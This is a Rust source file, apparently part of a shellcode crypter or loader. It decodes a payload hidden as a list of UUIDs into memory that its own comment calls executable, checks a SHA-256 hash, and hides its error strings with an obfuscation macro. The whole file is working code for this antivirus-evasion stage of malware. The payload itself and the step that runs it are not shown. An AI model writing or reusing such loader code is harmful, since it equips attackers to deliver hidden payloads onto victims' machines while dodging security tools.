use crate::alloc_mem::alloc_mem;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    use sha2::{Sha256, Digest};
    use rustcrypt_ct_macros::obf_lit;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obf_lit!("uuid payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let uuids_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obf_lit!("invalid utf8").to_string())?;
    let uuids: Vec<&str> = uuids_str.split(',').collect();
    // Allocate executable memory
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    for uuid_str in uuids {
        let u = uuid::Uuid::parse_str(uuid_str).map_err(|_| obf_lit!("Invalid UUID").to_string())?;
        let bytes = u.as_bytes();
        for &b in bytes {
            if idx >= original_len { break; }
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obf_lit!("uuid hash mismatch").to_string());
    }
    Ok((p as usize, original_len))
}